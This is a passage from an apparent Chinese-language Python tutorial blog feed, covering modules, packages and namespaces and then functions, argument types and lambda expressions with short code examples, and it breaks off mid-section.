        <content type="html"><![CDATA[<blockquote><p>基础永远值得花费90%的精力去学习加强。认识实践的重要性。</p></blockquote><h2 id="Ax-Python-Modules-模块"><a href="#Ax-Python-Modules-模块" class="headerlink" title="Ax Python Modules | 模块"></a>Ax Python Modules | 模块</h2><p>模块允许你逻辑地组织你的Python代码。将相关代码分组到一个模块中可以使代码更容易理解和使用。模块是一个Python对象，具有任意命名的属性，可以绑定和引用。</p><p>简单地说，模块是由Python代码组成的文件。模块可以定义函数、类和变量。模块还可以包含可运行代码。</p><p>可以说，一个.py文件名就算模块。</p><p>例创建一个support.py的文件</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">print_func</span><span class="token punctuation">(</span> par <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Hello : "</span><span class="token punctuation">,</span> par<span class="token punctuation">)</span>   <span class="token keyword">return</span></code></pre><h3 id="import"><a href="#import" class="headerlink" title="import"></a>import</h3><p>通过<code>import</code>语句，你可以将任何python文件当作模块。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> module1<span class="token punctuation">[</span><span class="token punctuation">,</span> module2<span class="token punctuation">[</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> moduleN<span class="token punctuation">]</span></code></pre><p>当解释器遇到import语句时，如果该模块出现在搜索路径中，它就导入该模块。搜索路径是解释器在导入模块之前搜索的目录列表。以导入“support.py”模块为例，需要在脚本顶部执行如下命令</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># Import module support</span><span class="token keyword">import</span> support<span class="token comment" spellcheck="true"># Now you can call defined function that module as follows</span>support<span class="token punctuation">.</span>print_func<span class="token punctuation">(</span><span class="token string">"Zara"</span><span class="token punctuation">)</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python">Hello <span class="token punctuation">:</span> Zara</code></pre><blockquote><p>一个模块只加载一次。以防重复执行模块。</p></blockquote><h3 id="from…import"><a href="#from…import" class="headerlink" title="from…import"></a>from…import</h3><p><code>from...import</code>允许你将模块中的特定属性导入到当前的命名空间中</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> modname <span class="token keyword">import</span> name1<span class="token punctuation">[</span><span class="token punctuation">,</span> name2<span class="token punctuation">[</span><span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> nameN<span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre><p>例如，从<code>fib</code>模块导入<code>fibonacci</code>函数，使用如下语句</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> fib <span class="token keyword">import</span> fibonacci</code></pre><p>就是只用某一个东西，不全部导入进来。</p><h3 id="from…import-1"><a href="#from…import-1" class="headerlink" title="from…import *"></a>from…import *</h3><p>将所有的命名空间导入到当前命名空间中。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> modname <span class="token keyword">import</span> <span class="token operator">*</span></code></pre><p>虽然简单方便，但谨慎使用。</p><h3 id="定位模块"><a href="#定位模块" class="headerlink" title="定位模块"></a>定位模块</h3><p>当导入模块时，python解析器按一下顺序搜索</p><ul><li>当前目录 <strong>sys.path</strong></li><li>PYTHONPATH变量中的每个路径</li><li>都失败则检查默认路径。</li></ul><h3 id="PYTHONPATH"><a href="#PYTHONPATH" class="headerlink" title="PYTHONPATH"></a>PYTHONPATH</h3><p>这是一个环境变量，设置变量的语法和shell相同，这是windows中</p><pre class=" language-python"><code class="language-python">set PYTHONPATH <span class="token operator">=</span> c<span class="token punctuation">:</span>\python20\lib<span class="token punctuation">;</span></code></pre><p>UNIX和Linux中</p><pre class=" language-python"><code class="language-python">set PYTHONPATH <span class="token operator">=</span> <span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>lib<span class="token operator">/</span>python</code></pre><h3 id="命名空间和范围"><a href="#命名空间和范围" class="headerlink" title="命名空间和范围"></a>命名空间和范围</h3><p>变量是映射到对象的名称(标识符)。命名空间是变量名(键)及其对应对象(值)的字典。</p><p>Python语句可以访问本地命名空间和全局命名空间中的变量。如果局部变量和全局变量具有相同的名称，则局部变量隐藏全局变量。</p><p>每个函数都有自己的本地名称空间。类方法遵循与普通函数相同的作用域规则。</p><p>Python对变量是局部的还是全局的做出有根据的猜测。它假定在函数中赋值的任何变量都是局部变量。</p><p>因此，为了给函数中的全局变量赋值，必须首先使用global语句。</p><p>global VarName语句告诉Python VarName是一个全局变量。Python停止在本地命名空间中搜索变量。</p><p>例如，我们在全局命名空间中定义了一个变量Money。在函数Money中，我们给Money赋值，因此Python假定Money为局部变量。但是，我们在设置本地变量Money之前访问了它的值，所以结果是UnboundLocalError。取消注释global语句可以解决这个问题。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>Money <span class="token operator">=</span> <span class="token number">2000</span><span class="token keyword">def</span> <span class="token function">AddMoney</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token comment" spellcheck="true"># Uncomment the following line to fix the code:</span>   <span class="token comment" spellcheck="true"># global Money</span>   Money <span class="token operator">=</span> Money <span class="token operator">+</span> <span class="token number">1</span><span class="token keyword">print</span> MoneyAddMoney<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span> Money</code></pre><h3 id="dir-函数"><a href="#dir-函数" class="headerlink" title="dir()函数"></a>dir()函数</h3><p>内置函数dir()返回一个已排序的字符串列表，其中包含模块定义的名称。</p><p>列表包含模块中定义的所有模块、变量和函数的名称。以下为简单示例</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># Import built-in module math</span><span class="token keyword">import</span> mathcontent <span class="token operator">=</span> dir<span class="token punctuation">(</span>math<span class="token punctuation">)</span><span class="token keyword">print</span> content</code></pre><p>执行</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token string">'__doc__'</span><span class="token punctuation">,</span> <span class="token string">'__file__'</span><span class="token punctuation">,</span> <span class="token string">'__name__'</span><span class="token punctuation">,</span> <span class="token string">'acos'</span><span class="token punctuation">,</span> <span class="token string">'asin'</span><span class="token punctuation">,</span> <span class="token string">'atan'</span><span class="token punctuation">,</span><span class="token string">'atan2'</span><span class="token punctuation">,</span> <span class="token string">'ceil'</span><span class="token punctuation">,</span> <span class="token string">'cos'</span><span class="token punctuation">,</span> <span class="token string">'cosh'</span><span class="token punctuation">,</span> <span class="token string">'degrees'</span><span class="token punctuation">,</span> <span class="token string">'e'</span><span class="token punctuation">,</span> <span class="token string">'exp'</span><span class="token punctuation">,</span><span class="token string">'fabs'</span><span class="token punctuation">,</span> <span class="token string">'floor'</span><span class="token punctuation">,</span> <span class="token string">'fmod'</span><span class="token punctuation">,</span> <span class="token string">'frexp'</span><span class="token punctuation">,</span> <span class="token string">'hypot'</span><span class="token punctuation">,</span> <span class="token string">'ldexp'</span><span class="token punctuation">,</span> <span class="token string">'log'</span><span class="token punctuation">,</span><span class="token string">'log10'</span><span class="token punctuation">,</span> <span class="token string">'modf'</span><span class="token punctuation">,</span> <span class="token string">'pi'</span><span class="token punctuation">,</span> <span class="token string">'pow'</span><span class="token punctuation">,</span> <span class="token string">'radians'</span><span class="token punctuation">,</span> <span class="token string">'sin'</span><span class="token punctuation">,</span> <span class="token string">'sinh'</span><span class="token punctuation">,</span><span class="token string">'sqrt'</span><span class="token punctuation">,</span> <span class="token string">'tan'</span><span class="token punctuation">,</span> <span class="token string">'tanh'</span><span class="token punctuation">]</span></code></pre><p>这里，特殊字符串变量__name__是模块的名称，而__file__是加载模块的文件名</p><h3 id="globals-和-locals-函数"><a href="#globals-和-locals-函数" class="headerlink" title="globals() 和 locals()函数"></a>globals() 和 locals()函数</h3><p>globals()和locals()函数可用于根据调用它们的位置返回全局名称空间和本地名称空间中的名称。</p><p>如果在函数内调用locals()，它将返回可从该函数本地访问的所有名称。</p><p>如果在函数内部调用globals()，它将返回从该函数全局访问的所有名称。</p><p>这两个函数的返回类型都是字典。因此，可以使用keys()函数提取名称。</p><h3 id="reload-函数"><a href="#reload-函数" class="headerlink" title="reload() 函数"></a>reload() 函数</h3><p>当模块被导入到脚本中时，模块顶层的代码只执行一次。</p><p>因此，如果您想重新执行模块中的顶级代码，可以使用reload()函数。reload()函数再次导入以前导入的模块。reload()函数的语法如下</p><pre class=" language-python"><code class="language-python">reload<span class="token punctuation">(</span>module_name<span class="token punctuation">)</span></code></pre><p>这里，module_name是您想要重新加载的模块的名称，而不是包含模块名称的字符串。例如，重新加载hello模块，请执行如下操作</p><pre class=" language-python"><code class="language-python">reload<span class="token punctuation">(</span>hello<span class="token punctuation">)</span></code></pre><h3 id="包"><a href="#包" class="headerlink" title="包"></a>包</h3><p>包是一种分层的文件目录结构，它定义了单个Python应用程序环境，该环境由模块、子包和子子包等组成。</p><p>假设在Phone目录中有一个文件Pots.py。该文件的源代码如下</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token keyword">def</span> <span class="token function">Pots</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"I'm Pots Phone"</span><span class="token punctuation">)</span></code></pre><p>类似地，我们还有另外两个文件，它们具有与上面相同名称的不同函数</p><ul><li><p><em>Phone/Isdn.py</em> 文件有 Isdn()</p></li><li><p><em>Phone/G3.py</em> 文件有 G3()</p></li></ul><p>现在，在Phone directory−中再创建一个文件<code>__init__.py</code></p><ul><li>Phone/<code>__init__.py</code></li></ul><p>要使所有函数在导入Phone时都可用，需要在<code>__init__.py</code>中显式地放入import语句，如下所示</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> Pots <span class="token keyword">import</span> Pots<span class="token keyword">from</span> Isdn <span class="token keyword">import</span> Isdn<span class="token keyword">from</span> G3 <span class="token keyword">import</span> G3</code></pre><p>将这些行添加到<code>__init__.py</code>之后，当您导入Phone包时，就有了所有这些类。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># Now import your Phone Package.</span><span class="token keyword">import</span> PhonePhone<span class="token punctuation">.</span>Pots<span class="token punctuation">(</span><span class="token punctuation">)</span>Phone<span class="token punctuation">.</span>Isdn<span class="token punctuation">(</span><span class="token punctuation">)</span>Phone<span class="token punctuation">.</span>G3<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python">I'm Pots PhoneI'm 3G PhoneI'm ISDN Phone</code></pre><p>在上面的例子中，我们在每个文件中只使用一个函数，但是您可以在您的文件中保存多个函数。你也可以在这些文件中定义不同的Python类，然后你可以用这些类创建你的包。</p><blockquote><p>如果你要在该文件的同级目录下的另一个目录中引用Phone包，必须在Phone同级目录也加上<code>__init__.py</code></p></blockquote><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Module </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python programming 8</title>
      <link href="posts/c482.html"/>
      <url>posts/c482.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>基础永远值得花费90%的精力去学习加强。认识实践的重要性。</p></blockquote><h2 id="Ax-Python-Functions-函数"><a href="#Ax-Python-Functions-函数" class="headerlink" title="Ax Python Functions | 函数"></a>Ax Python Functions | 函数</h2><p>函数是用于执行单个相关操作的有组织的、可重用的代码块。函数为应用程序提供了更好的模块化和高度的代码重用。</p><p>正如您已经知道的，Python提供了许多内置函数，如print()等，但您也可以创建自己的函数。这些函数称为用户定义函数。</p><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p>定义函数的规则</p><ul><li>函数以关键字def开头，后面跟着函数名和圆括号</li><li>参数在括号内</li><li>函数的第一条语句可以是可选语句，函数的文档字符串或docstring</li><li>函数中的代码块以: 开始并缩进。</li><li>return [expression]语句退出一个函数，并可选地将一个表达式返回给调用者。不带参数的return语句与return None相同。</li></ul><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">functionname</span><span class="token punctuation">(</span> parameters <span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token string">"function_docstring"</span>function_suite<span class="token keyword">return</span> <span class="token punctuation">[</span>expression<span class="token punctuation">]</span></code></pre><p>默认情况下，参数具有位置行为，您需要按照定义它们的顺序通知它们。</p><p>例</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">printme</span><span class="token punctuation">(</span> str <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token string">"This prints a passed string into this function"</span>   <span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span>   <span class="token keyword">return</span></code></pre><h3 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h3><p>定义函数只会给它一个名称，指定函数中包含的参数，并构造代码块。</p><p>一旦确定了函数的基本结构，就可以通过从另一个函数或直接从Python提示符调用它来执行它。下面是调用printme()函数−的示例</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># Function definition is here</span><span class="token keyword">def</span> <span class="token function">printme</span><span class="token punctuation">(</span> str <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token string">"This prints a passed string into this function"</span>   <span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span>   <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"># Now you can call printme function</span>printme<span class="token punctuation">(</span><span class="token string">"I'm first call to user defined function!"</span><span class="token punctuation">)</span>printme<span class="token punctuation">(</span><span class="token string">"Again second call to the same function"</span><span class="token punctuation">)</span></code></pre><p>执行 −</p><pre class=" language-python"><code class="language-python">I'm first call to user defined function!Again second call to the same function</code></pre><h3 id="通过引用和值的传递"><a href="#通过引用和值的传递" class="headerlink" title="通过引用和值的传递"></a>通过引用和值的传递</h3><p>Python 语言中的所有参数（参数）都是通过引用传递的。这意味着如果您更改函数中参数所指的内容，则更改也会反映在调用函数中。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># Function definition is here</span><span class="token keyword">def</span> <span class="token function">changeme</span><span class="token punctuation">(</span> mylist <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token string">"This changes a passed list into this function"</span>   mylist<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Values inside the function: "</span><span class="token punctuation">,</span> mylist<span class="token punctuation">)</span>   <span class="token keyword">return</span><span class="token comment" spellcheck="true"># Now you can call changeme function</span>mylist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">;</span>changeme<span class="token punctuation">(</span> mylist <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Values outside the function: "</span><span class="token punctuation">,</span> mylist<span class="token punctuation">)</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python">Values inside the function<span class="token punctuation">:</span>  <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">]</span>Values outside the function<span class="token punctuation">:</span>  <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre><p>另一个例子，通过引用传递函数内部和函数外部的参数</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># Function definition is here</span><span class="token keyword">def</span> <span class="token function">changeme</span><span class="token punctuation">(</span> mylist <span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token string">"This changes a passed list into this function"</span>    mylist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"values inside the function: "</span><span class="token punctuation">,</span> mylist<span class="token punctuation">)</span>    <span class="token keyword">return</span>mylist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">]</span>changeme<span class="token punctuation">(</span> mylist <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"values outside the function: "</span><span class="token punctuation">,</span> mylist<span class="token punctuation">)</span></code></pre><p>参数<em>mylist</em>是函数 changeme 的本地参数。在函数中更改 mylist 不会影响<em>mylist</em>。该函数什么也没做，最后这将产生以下结果 -</p><pre class=" language-python"><code class="language-python">values inside the function<span class="token punctuation">:</span>  <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span>values outside the function<span class="token punctuation">:</span>  <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">]</span></code></pre><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>您可以使用以下形式参数类型来调用函数</p><ul><li>Required arguments | 位置参数</li><li>Keyword arguments | 关键字参数</li><li>Default arguments | 默认参数</li><li>Variable-length arguments | 不定长参数</li></ul><h4 id="位置参数"><a href="#位置参数" class="headerlink" title="位置参数"></a>位置参数</h4><p>参数的顺序，数量必须一致，否则报错。</p><h4 id="关键字参数"><a href="#关键字参数" class="headerlink" title="关键字参数"></a>关键字参数</h4><p>书写正确的形参名字</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># Function definition is here</span><span class="token keyword">def</span> <span class="token function">printinfo</span><span class="token punctuation">(</span> name<span class="token punctuation">,</span> age <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token string">"This prints a passed info into this function"</span>   <span class="token keyword">print</span> <span class="token string">"Name: "</span><span class="token punctuation">,</span> name   <span class="token keyword">print</span> <span class="token string">"Age "</span><span class="token punctuation">,</span> age   <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"># Now you can call printinfo function</span>printinfo<span class="token punctuation">(</span> age<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"miki"</span> <span class="token punctuation">)</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python">Name<span class="token punctuation">:</span> mikiAge <span class="token number">50</span></code></pre><h4 id="默认参数"><a href="#默认参数" class="headerlink" title="默认参数"></a>默认参数</h4><p>调用时没有指定值，那么将使用函数默认定义的值。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span><span class="token comment" spellcheck="true"># Function definition is here</span><span class="token keyword">def</span> <span class="token function">printinfo</span><span class="token punctuation">(</span> name<span class="token punctuation">,</span> age <span class="token operator">=</span> <span class="token number">35</span> <span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token string">"This prints a passed info into this function"</span>   <span class="token keyword">print</span> <span class="token string">"Name: "</span><span class="token punctuation">,</span> name   <span class="token keyword">print</span> <span class="token string">"Age "</span><span class="token punctuation">,</span> age   <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true"># Now you can call printinfo function</span>printinfo<span class="token punctuation">(</span> age<span class="token operator">=</span><span class="token number">50</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">"miki"</span> <span class="token punctuation">)</span>printinfo<span class="token punctuation">(</span> name<span class="token operator">=</span><span class="token string">"miki"</span> <span class="token punctuation">)</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python">Name<span class="token punctuation">:</span> mikiAge <span class="token number">50</span>Name<span class="token punctuation">:</span> mikiAge <span class="token number">35</span></code></pre><h4 id="可变长度参数"><a href="#可变长度参数" class="headerlink" title="可变长度参数"></a>可变长度参数</h4><p>可以使用更多的参数，而不需要在函数中定义。他会存储在一个元组或字典中。语法：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">functionname</span><span class="token punctuation">(</span><span class="token punctuation">[</span>formal_args<span class="token punctuation">,</span><span class="token punctuation">]</span> <span class="token operator">*</span>var_args_tuple <span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token string">"function_docstring"</span>function_suite<span class="token keyword">return</span> <span class="token punctuation">[</span>expression<span class="token punctuation">]</span></code></pre><p>星号 (*) 放置在包含所有非关键字变量参数值的变量名称之前。如果在函数调用期间未指定其他参数，则此元组保持为空。以下是一个简单的例子</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">printinfo</span><span class="token punctuation">(</span> arg1<span class="token punctuation">,</span> <span class="token operator">*</span>vartuple <span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token string">"This prints a variable passed arguments"</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Output is:"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>arg1<span class="token punctuation">)</span>    <span class="token keyword">for</span> var <span class="token keyword">in</span> vartuple<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>var<span class="token punctuation">)</span>    <span class="token keyword">return</span>printinfo<span class="token punctuation">(</span> <span class="token number">10</span> <span class="token punctuation">)</span>printinfo<span class="token punctuation">(</span> <span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">50</span> <span class="token punctuation">)</span>printinfo<span class="token punctuation">(</span> <span class="token number">1</span><span class="token punctuation">)</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python">Output <span class="token keyword">is</span><span class="token punctuation">:</span><span class="token number">10</span>Output <span class="token keyword">is</span><span class="token punctuation">:</span><span class="token number">70</span><span class="token number">60</span><span class="token number">50</span>Output <span class="token keyword">is</span><span class="token punctuation">:</span><span class="token number">1</span></code></pre><h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><p>特点</p><ul><li>lambda 只是一个表达式，函数体比 def 简单很多。</li><li>lambda的主体是一个表达式，而不是一个代码块。仅仅能在lambda表达式中封装有限的逻辑进去。</li><li>lambda 函数拥有自己的命名空间，像嵌套的函数定义，lambda 函数可以从包含它的作用域中引用变量。</li></ul><p>语法</p><pre class=" language-python"><code class="language-python"><span class="token keyword">lambda</span> <span class="token punctuation">[</span>arg1 <span class="token punctuation">[</span><span class="token punctuation">,</span>arg2<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> argN<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> expression</code></pre><p>有些时候，当我们在传入函数时，不需要显式地定义函数，直接传入匿名函数更方便。匿名函数有个限制，就是只能有一个表达式，无需写return，返回值就是该表达式的结果。用匿名函数有个好处，因为函数没有名字，不必担心函数名冲突。此外，匿名函数也是一个函数对象，也可以把匿名函数赋值给一个变量，再利用变量来调用该函数。</p><p>例</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 可写函数说明</span>sum <span class="token operator">=</span> <span class="token keyword">lambda</span> arg1<span class="token punctuation">,</span> arg2<span class="token punctuation">:</span> arg1 <span class="token operator">+</span> arg2 <span class="token comment" spellcheck="true"># 调用sum函数</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"相加后的值为 : "</span><span class="token punctuation">,</span> sum<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"相加后的值为 : "</span><span class="token punctuation">,</span> sum<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>执行</p><pre class=" language-python"><code class="language-python">相加后的值为 <span class="token punctuation">:</span>  <span class="token number">30</span>相加后的值为 <span class="token punctuation">:</span>  <span class="token number">40</span></code></pre><p>直接调用匿名函数本身</p><pre class=" language-python"><code class="language-python"><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> x<span class="token operator">-</span>y<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>但通常都是在定义lambda函数的同时将其应用作为参数传递给另一个函数，该函数在其处理过程中对lambda定义的函数进行调用，例如：</p><pre class=" language-python"><code class="language-python">L <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span> <span class="token comment" spellcheck="true"># 过滤掉所有的偶数</span>res <span class="token operator">=</span> filter<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">,</span> L<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>list<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>找出两个数中小的那一个，我们可以用lambda这么写</p><pre class=" language-python"><code class="language-python">fn <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> x <span class="token keyword">if</span> x <span class="token operator">&lt;</span> y <span class="token keyword">else</span> y <span class="token keyword">print</span><span class="token punctuation">(</span>fn<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>相乘</p><pre class=" language-python"><code class="language-python">func <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y<span class="token punctuation">:</span> x<span class="token operator">*</span>y<span class="token keyword">print</span><span class="token punctuation">(</span>func<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>使用可变长参数求和</p><pre class=" language-python"><code class="language-python">func <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token operator">*</span>args<span class="token punctuation">:</span> sum<span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>func<span class="token punctuation">(</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>使用键值方式的可变长参数，输出为1</p><pre class=" language-python"><code class="language-python">key <span class="token operator">=</span> <span class="token keyword">lambda</span> <span class="token operator">**</span>kwargs<span class="token punctuation">:</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">(</span>name<span class="token operator">=</span><span class="token string">'steven'</span><span class="token punctuation">,</span>age<span class="token operator">=</span><span class="token number">36</span><span class="token punctuation">,</span>name2<span class="token operator">=</span><span class="token string">'co'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h3 id="返回语句"><a href="#返回语句" 